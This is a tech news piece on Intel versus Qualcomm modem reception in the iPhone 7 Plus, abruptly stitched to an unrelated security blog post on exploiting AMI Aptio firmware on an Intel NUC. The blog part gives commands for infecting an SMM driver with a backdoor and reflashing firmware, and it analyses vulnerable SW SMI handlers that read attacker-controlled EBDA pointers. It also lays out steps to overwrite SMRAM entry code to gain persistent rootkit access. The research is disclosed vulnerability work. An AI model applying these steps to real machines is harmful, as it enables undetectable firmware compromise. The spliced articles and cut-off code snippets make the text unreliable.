Are Intel's modems to blame for poor iPhone 7 Plus network reception? by Joe Roberts 21 October 2016 0 shares Read Comments New York-based research firm Cellular Insights, has blamed Intel modems for poor data connections on the iPhone 7 Plus. Apple used Intel's modems in iPhone 7 Plus models sold outside of China, Japan and the US, while phones sold in those countries come with modems made by Qualcomm. Cellular Insights conducted tests using networking equipment which showed iPhone 7 Plus models with both Qualcomm and Intel modems provided similar network performance under ideal conditions. Related: iPhone 7 But, as network conditions deteriorated, iPhone 7 models with Intel modems performed poorer than their Qualcomm-powered counterparts. As the research states: "In all tests, the iPhone 7 Plus with the Qualcomm modem had a significant performance edge over the iPhone 7 Plus with the Intel modem." This is the first time in five years that Apple has used a supplier other than Qualcomm for its handsets' modems, with Intel gaining a big client for its cellular modem business at a crucial time. The report continues: "We are not sure what was the main reason behind Apple's decision to source two different modem suppliers for the newest iPhone. "Considering that the iPhone with the Qualcomm modem is being sold in China, Japan and in the US only, we cannot imagine that modem performance was a deciding factor." In the tests, the Intel-based iPhone 7 Plus models yielded results that were at least 30% worse than the Qualcomm models, and in some cases there was a gap as large as 75%. The upshot is that the Intel phones will have poorer 4G reception than the Qualcomm versions, as well as slower download and upload speeds. For those interested in the technical details, here's Cellular Insight's wording: "At -96dBm the Intel variant needed to have Transport Block Size adjusted as BLER well exceeded the 2% threshold. At -105dBm the gap widened to 20%, and at -108dBm to a whopping 75%. "As a result of such a huge performance delta between the Intel and Qualcomm powered devices, we purchased another A1784 (AT&T) iPhone 7 Plus, in order to eliminate any possibility of a faulty device. The end result was virtually identical." If nothing else, the research is a reminder that, as the report puts it "OEM's implementation of baseband, RF front-end and the antenna design could play its role" in poor network reception, and network providers aren't always to blame.

My aimful life Another web log by Dmytro Oleksiuk aka Cr4sh Pages Главная страница About Saturday, October 22, 2016 Exploiting AMI Aptio firmware on example of Intel NUC Hi, everyone! This blog post is another usual article about firmware security of x86 compatible machines. Two previous articles were about my Lenovo ThinkPad T450s laptop. In "Exploiting SMM callout vulnerabilities in Lenovo firmware" I've shown some basic things related to exploitation and reverse engineering of its firmware on example of re-discovering already fixed 1day vulnerability. In another, "Exploring and exploiting Lenovo firmware secrets", I've shown how to achieve flash write protection bypass using any vulnerability that allows arbitrary System Management Mode code execution. Also, I released exploit for 0day vulnerability in SystemSmmRuntimeRt UEFI SMM driver called ThinkPwn. Today I’m sharing with you the story of my next x86 machine hacking — we’re going to talk about UEFI vulnerabilities, exploit mitigation features of System Management Mode and new exploit called Aptiocalypsis. Also, this time I did responsible disclosure to Intel and AMI, so, at the moment of this publication you already can patch some of vulnerable products. Lots of interesting things happened since release of ThinkPwn exploit. Firstly I supposed that vulnerable code was written by Lenovo or its Independent BIOS Vendor (IBV), but later it turned out that they've taken this totally mad driver from Intel reference code. This exact code is not available in public, but open source firmware of some Intel boards has it too. For example, SmmRuntimeManagementCallback() function from Intel Quark BSP it's exactly the same vulnerable code that I've found in firmware of my T450s. It’s also interesting that vulnerable code is quite old (it comes from EFI 1.x era) but nevertheless, it was never present in EDK2 source from public repository — its version of QuarkSocPkg was heavily modified in comparison with vulnerable one. The horrible and vulnerable by design piece of code was removed by Intel somewhere in the middle of 2014, but it seems that there were no security advisories regarding this issue. Due to this IBVs had no chance to fix this vulnerability in their relatively old code base and the bug appeared in modern computers from Lenovo, Intel, GIGABYTE, Dell, HP, Fujitsu and other OEM’s (oops!). Well, I guess at this point it’s much or less clear that currently there’s nothing to do with ThinkPad anymore, it was pwned with 0day, it has too awkward code base that follows ancient version of EFI specification and 8 series chipset that is not the freshest stuff you can get. As my next target for firmware security adventures I’ve decided to take some Skylake based machine of well-known vendor who might have a decent firmware that would be interesting to break. Because I like all kinds of small x86 compatible computers, I've put my eye on the latest generation of Intel NUC. It also looks interesting because platform vendor knows his hardware better than anyone else, so, from firmware security perspective, Intel NUC is definitely not the worst choice. My new test machine: Intel NUC. So, shortly after ThinkPwn release, I bought NUC6i3SYH model of Intel NUC and started its reverse engineering. Later it turned out that its firmware was based on Aptio V code base from AMI (meh) is not so secure: I managed to find four different arbitrary SMM code execution 0day vulnerabilities in AMI and Intel SMM drivers, much cooler than ThinkPwn. However, there was at least one interesting security feature in this Intel NUC: it uses SMM_Code_Chk_En bit that works pretty much like SMEP, but for System Management Mode. I've mentioned this security feature in my previous articles, but never met its support in firmwares of real products before. This time SMM exploitation was more tricky, but I must admit that even with SMM_Code_Chk_En modern platform firmware is much more exploit friendly than, for example, modern operating system kernel or modern web browser. Looking around and dumping SMRAM contents I decided to pwn my Intel NUC in the same way like ThinkPad T450s — discover some SMM vulnerability to bypass BIOS_CNTL flash write protection and then, having arbitrary System Management Mode code execution, check if I can do something with SPI Protected Ranges (PRx) flash write protection. As for the Intel BootGuard — it is still a relatively rare feature among mass market devices, so, I considered that most likely my NUC simple doesn’t have it. All these things altogether might allow attacker to infect platform firmware with persistent rootkit that survives operating system reinstall — that’s exactly what we want to achieve. But first things first! To check which flash write protection features are present on Intel NUC, I used CHIPSEC — platform security assessment framework from Intel that was already mentioned in my blog many times. Among others modules, CHIPSEC has module named common.bios_wp and it shows the information we need: # python chipsec_main.py -m common.bios_wp

[!] None of the SPI protected ranges write-protect BIOS region
 Here I got some unpleasant surprise: as you can see, CHIPSEC reports that PR0-PR4 registers have zero values which means that Intel NUC doesn't use Protected Ranges flash write protection at all. It sounds amusing: my other (even more old) machines like ThinkPad T450s and Apple MacBook Pro 10,2 use PRx in addition to BIOS_CNTL and of course I've expected to have all possible security features on the latest generation Intel machine as well. On the other side — NUC firmware was written rather by AMI than Intel, same as the firmware of my Intel DQ77KB motherboard from previous articles that also doesn’t use SPI Protected Ranges. Definitely, this weird tradition looks like a birth injury of whole AMI Aptio platform including the most recent fifth version. What does it mean from the practical side? SPI Protected Ranges is very nice security mechanism, it allows to implement flash write protection that doesn’t rely on SMM code at all (in theory at least, in real life very often it’s not true, see PRx bypass part of my previous article). On platforms where PRx flash write protection is not available — attacker can use any arbitrary SMM code execution vulnerability (like ThinkPwn) to overwrite the whole platform firmware with malicious code in relatively easy way. Thanks to this gift from Intel and AMI, we can say for sure that technically NUC is already broken, I bet there aren't any machines with AMI firmware on the market which don't have at least a single SMM vulnerability. So, everything what we need — do some reverse engineering and write some code to prove it, sounds easy. The most common way of SMM exploitation is through vulnerabilities in System Management Interrupt (SMI) handlers. Usually SMM drives of modern UEFI compatible firmwares have dozens of such handlers. For more information about UEFI SMM drivers architecture and different kinds of SMI handlers please read "System Management Mode Core Interface" part of Platform Initialization Specification and my older article "Building reliable SMM backdoor for UEFI based platforms". The most interesting kind of SMI handlers suitable for ring0 to SMM exploitation is SW SMI, such handlers can be called from running operating system by writing the handler number into the APMC I/O port 0xB2. Because every SMI handler needs to be registered manually by its driver — there’s no static SMI handlers list stored somewhere inside flash image. To get such list we have two main options: Take hardware SPI programmer and infect platform firmware with my UEFI SMM backdoor which allows dumping System Management RAM (SMRAM) from running operating system. Then we can parse it’s internal structures to extract list of currently registered SMI handlers that we’re interested in. Significant drawback of this approach — it will likely not work on the platforms which have properly integrated Intel BootGuard. However, there are lots of machines with broken and incomplete BootGuard implementation that checks only PEI volume integrity and allows modifications of DXE volume, so, you can try your luck with SMM backdoor in any case. Extract all SMM drivers from your platform firmware and perform their reverse engineering to find existing calls to the RegisterHandler() function of EFI_SMM_SW_DISPATCH2_PROTOCOL used to register SW SMI handlers. Indeed, this approach is much more time consumable so I’m trying to avoid it because it's good to keep your weekend day research as cheap as possible. Of course, we can read platform firmware (except Management Engine region) without any specialized hardware just using CHIPSEC, but writing modified firmware back to the SPI flash chip on motherboard where it resides will require some hardware programmer in any case: BIOS_CNTL flash write protection will prohibit us to flash the firmware image with broken digital signature in regular software way. One of my favorite microchips of all time is FT2232H from FTDI — its dual channel USB to serial converter that supports various protocols and configurations. It can work with UART, I2C, SPI and JTAG protocols, it also supports bit-bang mode and multi-protocol synchronous high speed engine (MPSSE) — its pretty much a real digital electronics swiss knife. There’s also a single channel version of this chip called FT232H, but as for me it’s more convenient to have dual channel one: for example, you can flash firmware to your target device over SPI and debug it via JTAG in the same time which is very convenient. Also, there are some motherboards which use more than one SPI flash chip to store platform firmware (my Intel DQ77KB motherboard uses two). To work with this neat chip you can buy official FT2232H Mini Module from FTDI or make your own board. To use FT2232H Mini Module as SPI flash programmer you have to install flashrom tool and connect target flash chip to the board like shown in this table: For physical connection between programmer and flash chip in SOIC8 package there are numerous convenient tools like microprobes or SOIC8 test clips. Also, some machines have WSON packaged flash chips which require some soldering. My Intel NUC uses Winbond W25Q64CV chip in SOIC8 package — the most popular flash chip on the market, it can be found in almost any randomly picked PC. Despite of its SOIC8 package that doesn’t really require soldering for programmer connection, I prefer to have a wires soldered to my flash chip with standard pin header on their other end. In practice it’s more convenient and solid than test clips or microprobes because you can put your motherboard with soldered wires back to the case and reconnect the programmer in several seconds. Also, I have to unbrick my test devices pretty often which is also more convenient to do with permanently soldered wires. On the picture you can see Intel NUC with FT2232H Mini Module connected to its flash chip: My setup for firmware reading and writing. After that we can read the firmware image using flashrom: # flashrom -p ft2232_spi:type=2232H,port=A -r flash_image_nuc.bin Now, when we have flashable image file with platform firmware, we can open it in UEFITool (another awesome utility that was mentioned in my articles many times) and extract some SMM driver PE image to infect it with UEFI SMM backdoor. I picked up some AMI driver called NvramSmi, but technically it doesn’t matter — you can use any SMM driver available in your firmware except, probably, SMM core itself. NUC firmware loaded into UEFITool. On the picture above you can notice that UEFITool haven’t found any Firmware Interface Table (FIT) entries responsible for BootGuard configuration (there’s only some FIT entries with microcode updates) which confirms our early made hypothesis that Intel NUC has no BootGuard support at all. Now we can say for sure — any arbitrary SMM code execution vulnerability on this platform automatically means complete pwnage of entire platform firmware. Yeah, it’s a much smaller amount of fun than I expected. UEFI SMM backdoor comes with multi-functional SmmBackdoor.py Python program, it allows to infect arbitrary SMM driver PE image with the backdoor code and communicate with this code when system was booted with infected firmware. To infect NvramSmi driver image that was extracted in previous step, use the following command where SmmBackdoor.efi is backdoor executable image compiled for proper architecture (usually it’s x86_64): $ python SmmBackdoor.py -i NvramSmi.efi -p SmmBackdoor.efi -o NvramSmi_infected.efi
[+] Target image to infect: NvramSmi.efi

New entry point RVA is 0x00002e44
New .xdata virtual size is 0x00005b80
New image size is 0x00006da0
[+] DONE
 Now we can integrate infected driver back into the flash image using UEFITool. Please note, that currently there are two UEFITool branches: so called new engine and old engine. The new engine has much more nice source code with lots of cool new features, but only the old one currently supports flash image modification, so, to deploy UEFI SMM backdoor you have to use something like old UEFITool 0.2x rather than the new 0.3x. Write infected firmware image back into the flash chip: # flashrom -p ft2232_spi:type=2232H,port=A -w flash_image_nuc.bin Now we can boot Intel NUC with modified firmware, while it boots you can see debug output of UEFI SMM backdoor on the screen which is very convenient for troubleshooting. Also, backdoor is trying to print the same debug output into the first COM port, but it seems that on Intel NUC there’s no such ports present (yeah, totally not cool, but on the other side it has LPC debug header that also might be interesting for debug purposes). Having fun with infected Intel NUC firmware. When operating system was booted (I’m using live USB stick with Gentoo Linux that has flashrom, CHIPSEC, UEFI SMM backdoor, my UEFI boot script table exploit with software DMA attack tools and other useful stuff for firmware security research) we finally can run several commands to communicate with installed backdoor. First one is used to check its presence and get some basic information about SMRAM layout. Second one is used to dump all SMRAM regions discovered on target platform into the files. localhost ~ # python SmmBackdoor.py --test

[+] DONE
 As you can see from the output, we have one SMRAM region (it’s obviously TSEG) with total size of 0x400000 bytes, now it's time to load it into the IDA Pro and check if we can make some tools to extract SMI handlers list and other useful information about SMM drivers execution environment. System Management Mode memory forensics It’s quite interesting fact that "System Management Mode Core Interface" specification and its practical implementations from EDK2 or AMI Aptio were designed with respect to physical memory forensics which is obviously useful for fault analysis during platform bring-up. The first important thing you should know about SMRAM dumps — they’re relatively friendly for analysis, almost every important structure has unique 4-byte signature which allows to locate and recognize the structure contents inside physical memory dump. For example, EFI_SMM_SYSTEM_TABLE structure location can be found with the checking for "SMST" signature: # get offset of EFI_SMM_SYSTEM_TABLE structure inside SMRAM dump contents
def get_smst_offset(data):

    ret = data.find('SMST\0\0\0\0')
    assert ret != -1

    return ret
 The second thing that makes your life much easier — lots of the structures which belong to the same type (like SMM protocols or SMI handlers structures) are joined into double-linked list using EFI_LIST_ENTRY field: typedef struct _EFI_LIST_ENTRY
{
    struct _EFI_LIST_ENTRY *ForwardLink;
    struct _EFI_LIST_ENTRY *BackLink;

} EFI_LIST_ENTRY;
 So, when you find one structure of some type, you can easily iterate over all the structures of the same type that currently presents in memory. Third, for proper analysis of SMRAM dump you need to know actual physical address of the memory where it was located. Of course, you can store this meta-information inside separate file in addition to memory dump file, but there’s a better way — you can extract this address from the dump itself. This code works well on SMRAM dumps from all Intel compatible machines that I have at my home: # get physical address of SMRAM location for given SMRAM dump contents
def get_smram_addr(data):

    # extract and truncate SMRAM pointer at fixed offset
    return unpack('Q', self.data[0x10 : 0x18])[0] & 0xff400000
 Intel ships open source reference implementation of UEFI compatible firmware called EDK2, but it's code contains mostly top level interfaces which are described in the specs. Obviously, UEFI specification has nothing to do with certain configuration features of exact hardware and it’s not even a thing that was designed specifically for IA-32 architecture or Intel chips. The part of platform firmware code (and I must admit it’s quite large part) that implements support of specific hardware is called Board Support Package (BSP) and unfortunately, BSP for "large" Intel products like chipsets (that can be found inside your laptop or desktop PC) is not available in public. Why does it matter for dumps analysis? The most interesting parts of SMM code like SMI management, SMRAM regions protection, etc. belong to the BSP, so, EDK2 code base can’t provide us complete information about internal SMM core structures. Luckily, there’s a small Intel board called Galileo based on Intel Quark SoC which implements a much or less complete subset of i586 architecture including System Management Mode. At first glance this product looks strange (x86 based Arduino, hell yeah!), but if we throw away all of the marketing bullshit around it like compatibility with Arduino IDE and shields, IoT hype and other garbage — we will clearly see that Galileo was the first Intel attempt to create cheap and relatively open hardware platform for UEFI development enthusiasts. Galileo provides you JTAG (!!!) with OpenOCD configuration files prepared by the vendor, one PCI Express Mini Card slot, one 100 Mbit Ethernet port and some GPIO pins available over Arduino shields connector. Also, it comes with open source BSP which allows you to build EDK2 based Galileo firmware from the source code, it even has a pretty robust implementation of UEFI Secure Boot! If we look into the source files of Quark BSP responsible for Quark North Cluster configuration we will figure that registered handler for any of its SMI sources like SW dispatch, Sx dispatch, periodic timer dispatch, etc. is represented by DATABASE_RECORD structure with "DBRC" signature: #define DATABASE_RECORD_SIGNATURE SIGNATURE_32 ('D', 'B', 'R', 'C')

struct _DATABASE_RECORD
{
    UINT32                          Signature;
    LIST_ENTRY                      Link;
    BOOLEAN                         Processed;

    // Status and Enable bit description
    QNC_SMM_SOURCE_DESC             SrcDesc;

    // Callback function
    EFI_SMM_HANDLER_ENTRY_POINT2    Callback;

    QNC_SMM_CONTEXT                 ChildContext;
    VOID                            *CallbackContext;
    QNC_SMM_BUFFER                  CommBuffer;
    UINTN                           BufferSize;

    // Special handling hooks -- init them to NULL if unused/unneeded
    QNC_SMM_CLEAR_SOURCE            ClearSource; // needed for SW SMI timer

    // Functions required to make callback code general
    CONTEXT_FUNCTIONS               ContextFunctions;

    // The protocol which this record dispatches
    QNC_SMM_PROTOCOL_TYPE           ProtocolType;
};
 Of course, on firmware from other vendor that was designed for other Intel chips DATABASE_RECORD structure will have a different format almost for sure. But at least, now we have a clue about what exactly we should look inside of SMRAM dump to identify registered SW SMI handlers. Here you can see some "DBRC" signature occurrence that was found inside SMRAM dump from Intel NUC: seg000:000000008B76C410                 dq 'CRBD' ; database record header signature

 To confirm that it’s actually valid DATABASE_RECORD structure that describes really existing SMI handler of needed type you have to follow by its handler directly to SMM driver image where it is located, and check which exactly SMM protocol was used by this driver to register our handler function. If we see some call to EFI_SMM_SW_DISPATCH2_PROTOCOL.RegisterHandler() there — we’re fine to go next. At this point you also may notice, that DATABASE_RECORD structure has several quad words with 0x34 and 0x504 constant values which allow us to identify SW SMI handlers among SMI handlers of other types. Now we can write a Python function that scans SMRAM dump contents for any valid DATABASE_RECORD structure, iterates over all registered SMI handlers using list entry field and prints information about SW SMI handlers which were found: def dump_sw_smi_handlers():

    first_entry, ptr = None, 0
    parse = lambda offset: unpack('QQ104sQQQ', smram[offset : offset + 0x90])

    # find any valid DATABASE_RECORD structure
    while ptr < SMRAM_SIZE - 0x100:

        # check for 'DBRC' signature
        if smram[ptr : ptr + 4] == 'DBRC':

            flink, blink, _, _, func, smi = parse(ptr + 8)

 There are two interesting aspects of doing security research and reverse engineering as hobby. Firstly, you will likely not be paid for your wasted time. Secondly, there are too many interesting devices on the market which deserve your hands to be putten on and you have to be super productive to be able to do that. In such conditions it’s very important to automate as many relatively simple tasks, which need to be repeated for each target, as possible. You've already seen some junk code for SMRAM dumps analysis in my previous articles, but this time I decided to create a more proper tool that would be able to take your dump as input and give you the most useful information for comfortable reverse engineering of SMM code. Currently this tool is able to extract the following: SMRAM and SMST address information Loaded SMM drivers list SMM protocols list SMI entry address for each CPU SW SMI handlers list Root SmiHandlerRegister() handlers list Child SmiHandlerRegister() handlers list The tool can be downloaded from it's GitHub repository. To identify GUIDs and names of SMM drivers which were found inside SMRAM dump, it optionally can use UEFIDump command line utility to extract information about available SMM drivers from flash image file and then match these drivers by PE header fields with drivers found in SMRAM. Also, it allows to resolve names of common UEFI GUIDs which might be found in public header files, to use this feature you have to install ida-efiutils and specify its folder path in EFIUTILS_PATH variable. Usage of the tool from command line: $ smram_parse.py <smram_dump> [flash_image_dump] And its full output for SMRAM dump that was taken from my Intel NUC with firmware version SYSKLi35.86A.0045: $ python smram_parse.py TSEG_nuc.bin flash_image_nuc.bin

NOTES:

 * - SW SMI handler uses ReadSaveState()/WriteSaveState()
 From the output you may notice that there are several unnamed SMM drivers with several SW SMI handlers — they obviously belong to our SMM backdoor image (SW SMI handler with number 0xCC) and NvramSmi driver that was infected with backdoor code. Probably, someone might find this tool useful not only for reverse engineering purposes, but also for hunting on System Management Mode rootkits. I also want to admit that currently it’s a first known public tool (and I hope not the last) for SMRAM forensics. The tool was written mostly during my work on Intel NUC firmware reverse engineering and currently significant part of its code is nailed specifically to SMRAM dumps from AMI Aptio V based firmwares (do you still remember that different firmware versions from different vendors usually have different format of certain SMM structures that we have to deal with?). I already started to work on support of Lenovo ThinkPad firmwares, but if you want to do some good thing — take UEFI SMM backdoor, obtain SMRAM dump from your own machine, implement its support in smram_parse.py and send me your pull request. Exploring SW SMI handlers code From the output that was shown above, we see 22 SW SMI handlers in 15 different UEFI SMM drivers. In addition, 3 drivers obtain CPU register values from CPU saved state area using EFI_SMM_CPU_PROTOCOL — this information might be interesting because CPU saved state might be used to pass attacker controlled values directly into the SW SMI handler. Now we need to take a quick look over all these handlers without digging too deep and check their code for obvious security flaws. Each SW SMI handler function has following signature defined in "System Management Mode Core Interface specification": typedef
EFI_STATUS
(EFIAPI * EFI_SMM_HANDLER_ENTRY_POINT2)(
    IN EFI_HANDLE   DispatchHandle,
    IN CONST VOID   *Context            OPTIONAL,
    IN OUT VOID     *CommBuffer         OPTIONAL,
    IN OUT UINTN    *CommBufferSize     OPTIONAL
);
 Context argument usually points to EFI_SMM_SW_CONTEXT structure that allows to determine some information about SW SMI call occurred — like its number (useful when your driver has the same function registered as several different SW SMI handlers) and number of CPU where the SMI was generated: typedef struct
{
    UINTN SwSmiCpuIndex;
    UINT8 CommandPort;
    UINT8 DataPort;

 After an hour of much or less relaxed work, I found some interesting SW SMI handler sub_8B6ECB7C() with number 0x31 that belongs to UsbRt SMM driver. I've already seen SMM driver with same name in other firmwares, which means that it was likely written by AMI. Let’s check the handler code: EFI_STATUS __cdecl sub_8B6ECB7C(
    EFI_HANDLE DispatchHandle,
    VOID *Context, VOID *CommBuffer, UINTN *CommBufferSize)
{
    VOID *v4; // rcx@1
    EFI_STATUS result; // eax@5

    // get some structure pointer stored in global variable
    v4 = qword_8B7024F8;
    if (qword_8B7024F8)
    {
        // if global variable is not zero -- clear it
        qword_8B7024F8 = 0;
    }
    else
    {
        //
        // If global variable is zero -- calculate structure address
        // based on 4 byte unsigned integer stored in 1-st magebyte of
        // physical memory at 0x40e (attacker controllable) location.
        //
        v4 = (VOID *)*(_DWORD *)(*(unsigned short *)0x40E * 0x10 + 0x104);
    }

    if (v4)
    {
        // pass structure pointer to child function with no sanity checks
        sub_8B6EC888(v4);
        result = 0;
    }
    else
    {
        result = 9;
    }

    return result;
}
 As you can see, it reads attacker controlled two byte word located at 0x40E physical address, then it uses this value to calculate some memory address and read some pointer from that address. Then sub_8B6ECB7C() is passing obtained pointer value into sub_8B6EC888() function as single argument. Address 0x40E is located in first megabyte of physical memory space and it obviously means some stuff related to legacy BIOS. According to BIOS Data Area memory map — value at 40:0E address contains segment number of memory region called Extended BIOS Data Area (EBDA) with the following layout: Offset   Size       Description

 Pointer value that is being passed into the sub_8B6EC888() by SW SMI handler routine is located at offset 0x104 from the beginning of EBDA, I haven’t found any information about this part of EBDA in any public sources, so, I’m considering that it is used for some OEM or IBV specific magic from legacy BIOS era. Here’s the code of sub_8B6EC888() function that receives attacker controlled pointer value: void __fastcall sub_8B6EC888(void *SomeStruct)
{
  unsigned __int8 v1; // al@2

    if (SomeStruct)
    {
        // read byte form the beginning of the structure
        v1 = *(_BYTE *)SomeStruct;

        if (!*(_BYTE *)SomeStruct)
        {
LABEL_6:
            //
            // Use readed byte as index to call child function which
            // address is stored in array.
            //
            // Each function from off_8B6EBDF0 array accepts attacker
            // controlled structure pointer as first argument, so, their
            // code also may contain some useful exploitation primitives.
            //
            off_8B6EBDF0[(unsigned __int64)v1](SomeStruct);
            return;
        }

        // some checks to prevent array index overrun
        if (v1 >= 0x20 && v1 <= 0x38)
        {
            v1 -= 0x1F;
            goto LABEL_6;
        }

        //
        // Write constant value to the structure with attacker controlled
        // address. It might be used as exploitation primitive to overwrite
        // arbitrary byte within SMRAM with 0xF0 value.
        //
        *((_BYTE *)SomeStruct + 2) = 0xF0;
    }
}
 Yay! This function has no sanity checks of received pointer, upon finishing it writes byte with constant value 0xF0 at offset 0x02. Because pointer value that we’re talking about is controlled by attacker, it allows him to pass the pointer of some certain SMRAM structure into the sub_8B6EC888() and overwrite its byte with constant value. It’s not the most powerful exploitation primitive, but it still allows to achieve arbitrary SMM code execution in relatively easy way. In addition, sub_8B6EC888() function also calls specific child function by attacker controlled index from the statically initialized array located at address 0x8B6EBDF0. Here you can see array contents, these functions also accept the same pointer and heavily work with attacker controlled data what probably can give us even more larger attack surface and more nice exploitation primitives: seg000:000000008B6EBDF0 off_8B6EBDF0    dq offset sub_8B6ECE80

 However, we don’t need to go that deep because arbitrary memory overwrite with constant byte is pretty enough for our purposes. Exploitation of this vulnerability can be done in following steps: Find some code or data that affects execution flow and is located at fixed or predictable offset from the beginning of SMRAM. System Management Mode execution environment has its own page tables with all memory protection features available in regular x86_64 long mode. Luckily to us, SMM virtual memory space on machines with modern firmwares is still directly mapped to physical memory space one by one with RWX permissions for every single page. This fact allows us to overwrite long mode part of SMI entry code for the first CPU that is located at offset 0x3D50E5 from the beginning of SMRAM — it’s a good candidate because this offset should be the same for any version of firmware based on AMI Aptio V code base. At offset 0x3D5116 SMI entry code has MOV instruction that puts address of some function into RAX register. This function will be called at offset 0x3D5130 to do main part of SMI handling process. We need to trigger SW SMI handler of UsbRt driver with properly configured EBDA to overwrite second argument of this instruction with 0xF0 constant to redirect execution flow from SMI entry to attacker controlled code located outside of SMRAM. Then we need to trigger any SMI on first CPU to execute the shellcode. In addition to its usual job, such shellcode also needs to restore the bytes which were overwritten in previous step. Here’s assembly code of SMI entry that we need to patch:                                         ;
                                        ; Long mode part of SMI handler code, it is

 Unfortunately, I faced one problem when described exploit was implemented — my NUC completely hangs at 3-rd step of vulnerability exploitation. UEFI SMM backdoor helped me to verify that SMI entry code was overwritten in proper way, so, there’s only one reason why the exploit might not work. Starting from Haswell microarchitecture Intel processors support security feature called SMM_Code_Chk_En — when CPU enters into System Management Mode, it prohibits execution of any code located outside of SMRAM region by throwing unrecoverable and unhandleable Machine Check Exception (MCE). It works quite similar to Supervisor Mode Execution Prevention (SMEP) security feature that prohibits to execute ring 0 code located inside user space memory. I had never seen any firmware that actually uses SMM_Code_Chk_En before, so, it seems that now we have at least one interesting challenge of Intel NUC exploitation. SMM_Code_Chk_En bit is located in MSR_SMM_FEATURE_CONTROL model specific register that has the following description: Please notice that the Lock bit of MSR_SMM_FEATURE_CONTROL register — when it is set it’s not possible to modify this register value anymore till next full reset. In addition to this I discovered another interesting behaviour of MSR_SMM_FEATURE_CONTROL — when this MSR register is locked you can’t even read its value from non-SMM code. To indicate that target platform supports SMM_Code_Chk_En feature there’s SMM_Code_Access_Chk bit of MSR_SMM_MCA_CAP register: To check that Intel NUC firmware actually uses SMM_Code_Chk_En protection I modified UEFI SMM backdoor code to read the values of two model specific registers described above at the end of DXE phase of Platform Initialization: // required model specific registers numbers
#define MSR_SMM_MCA_CAP          0x17D

 Yeah, that’s exactly what we expected to see which means that we have to change our exploitation scenario to bypass SMM_Code_Chk_En by, for example, copying our code into SMRAM before its execution. It’s also interesting to know, that behaviour of SMM_Code_Chk_En feature can be emulated even on older platforms don't have this bit. As it was already said, System Management Mode code has its own page tables with fully functional memory protection mechanisms. It allows firmware developers to prohibit unwanted code execution by setting of NX bit for every PTE entry that describes memory page located outside of SMRAM. I wonder why AMI and Intel devs are missing such great opportunity to make System Management Mode exploitation significantly more expensive in relatively low cost, using this approach you even can make some physical memory pages completely unaccessible from your SMM code — a hand made SMAP for System Management Mode! However, I’m glad that I met at least one machine that actually uses SMM_Code_Chk_En feture, on my memory it’s first non-academical attempt to deploy such exploit mitigation features into SMM. Also, part IV of "A Tour Beyond BIOS Implementing Profiling in with EDK II" whitepaper from Intel explains applied use-cases of SMM profiling features that present in PiSmmCpuDxeSmm driver from EDK2: During runtime, when there is an outside SMRAM code or data access, the page fault exception (#PF) is triggered. The #PF handler SmmProfilePFHandler() inserts a record in the profile table and patches the corresponding page table entry to be valid. Then the root #PF handle PageFaultIdtHandlerSmmProfile() enables the single step debug exception and returns to the original instruction The original code can execute one instruction and then triggers a debug exception (#DB). The #DB handler DebugExceptionHandler() restores the original page table entry in order to catch the page fault exception again. I think these features might be useful not only for profiling/debugging, but also for exploit mitigation purposes as SMM_Code_Chk_En replacement or, even better, in addition to it. Other SW SMI handlers vulnerabilities Because SMM_Code_Chk_En feature makes exploitation of discovered UsbRt driver vulnerability a bit less trivial, I decided to finish my quick audit of registered SW SMI handlers. Who knows, maybe we will able to find some more powerful exploitation primitives like overwriting of arbitrary memory with arbitrary value. After one vulnerable SW SMI handler was found — we can do our work a bit more simpler and save some time by checking other SW SMI handlers that access EBDA as probably vulnerable high priority targets. To determine whether some SMM driver is accessing EBDA region we can use a simple binary signature. Let’s check assembly code of vulnerable UsbRt SW SMI handler to find it out: seg000:000000008B6ECB7C                sub_8B6ECB7C    proc near

 The key part of this function — two assembly instructions at addresses 0x8B6ECB9D and 0x8B6ECBA5, these instructions read EBDA segment number from constant address 0x40E and then convert it to EBDA physical address. It will be pretty sane to assume, that other UEFI SMM drivers from the same vendor that which were built with same toolchain also may use same assembly instructions to access EBDA. Let’s open NUC flash image in UEFITool and do binary search by signature C1 E0 04 05 04 01 00 00 that represents two assembly instructions shown above: Signature search for vulnerable UEFI SMM drivers. Bingo! In addition to already analysed UsbRt driver UEFITool was able to find two other SMM drivers which have these bytes in their executable images: Signature search results. Binary signature search (especially with relatively short signatures like this one) is not very reliable method to match desired executable code, due to this reason we still need to perform some quick verification to be sure that matched drivers are not false positives and their code actually has SW SMI handlers which use EBDA in the same way as UsbRt driver. It appears that there were no false positives, so, here’s the list of interesting UEFI SMM drivers from Intel NUC firmware: GUID = 04EAAAA1-29A1-11D7-8838-00500473D4EB, name = UsbRt (was shown above) GUID = E5E2C9D9-5BF5-497E-8860-94F81A09ADE0, name = NvmeSmm GUID = EA343100-1A37-4239-A3CB-B92240B935CF, name = SdioSmm NvmeSmm and SdioSmm drivers have SW SMI handlers with addresses 0x8B716E40 and 0x8B700C94 correspondingly. After short reverse engineering of their code I figured that both of them read some structure pointer from EBDA and performs read and write operations with its fields without any security checks in the way like it was done in UsbRt driver. Here’s the code of SW SMI handler 0x42 that belongs to NvmeSmm driver, its pretty much the same as the code of vulnerable 0x31 SW SMI handler that was shown above: FI_STATUS __cdecl sub_8B716E40(
    EFI_HANDLE DispatchHandle,
    VOID *Context, VOID *CommBuffer, UINTN *CommBufferSize)
{
    VOID *v4; // rbx@1
    EFI_STATUS v5; // edi@1
    signed __int64 v6; // rax@4
    EFI_STATUS v7; // esi@4

    v4 = *(VOID **)CommBuffer;
    v5 = 0;
    byte_8B718250 = 1;

    if (v4)
    {
        *(_QWORD *)CommBuffer = 0;
    }
    else
    {
        v4 = (VOID *)*(_DWORD *)(*(unsigned int *)0x40E * 0x10 + 0x104);
    }

    v6 = sub_8B717E68((unsigned __int64)v4);
    v7 = v6;
    if (v6 < 0)
    {
        goto LABEL_8;
    }

    if (*(_BYTE *)v4 != 0x27 || *((_BYTE *)v4 + 1) >= 0xC)
    {
        v5 = v6;

LABEL_8:
        *((_BYTE *)v4 + 2) = 7;
        return v5;
    }

    off_8B7162C0[(unsigned __int64)*((_BYTE *)v4 + 1)](v4);
    return v7;
}
 If easy satisfiable input conditions were met, this function writes a byte with value 0x07 at offset 0x02 into the structure with attacker supplied address, it allows to overwrite almost any part of SMRAM with known constant. Also, sub_8B716E40() calls some child function by index in function array at address 0x8B7162C0 with attacker controlled structure pointer as its argument. Just like in case of sub_8B6EC888(), function from UsbRt driver, it leads to exposing large attack surface which might contain some other exploitation primitives. Let’s check the code of the third vulnerable SW SMI handler with number 0x40 that belongs to SdioSmm UEFI SMM driver: EFI_STATUS __cdecl sub_8B700C94(
    EFI_HANDLE DispatchHandle,
